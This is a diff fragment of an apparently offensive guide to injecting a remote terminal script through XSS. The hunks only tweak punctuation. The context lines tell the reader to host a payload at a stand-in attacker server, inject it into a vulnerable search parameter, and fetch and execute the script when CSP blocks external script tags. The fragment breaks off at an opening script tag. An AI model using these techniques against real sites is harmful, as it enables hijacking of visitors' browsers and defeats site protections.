@@ -7,7 +7,7 @@ Pop's up a terminal via XSS for direct code input
     *   A simple Python HTTP server `python -m http.server 8000` on your machine, if accessible.
     *   A dedicated web server (Nginx, Apache).
     *   A cloud hosting service or CDN.
-    *   Services like `pastebin` (raw view), `gist` (raw view), or specialized payload hosting services (be cautious about terms of service).
+    *   Services like `pastebin` (raw view), `gist` (raw view), or specialized payload hosting services, be cautious about terms of service.
 
     Let's assume you host it at `http://your-attacker-server.com/term.js`.
 
@@ -39,7 +39,7 @@ If the vulnerable URL is `http://vulnerable-site.com/search?query=UserInput`, yo
 
 **Alternative: Fetch and Execute. If `<script src>` is blocked by CSP**
 
-If the site has a Content Security Policy that prevents loading scripts from external domains (`script-src 'self'`), but *might* allow fetching data (`connect-src`), you could try fetching the script and executing it:
+If the site has a Content Security Policy that prevents loading scripts from external domains `script-src 'self'`, but *might* allow fetching data `connect-src`, you could try fetching the script and executing it:
 
 ```html
 <script>
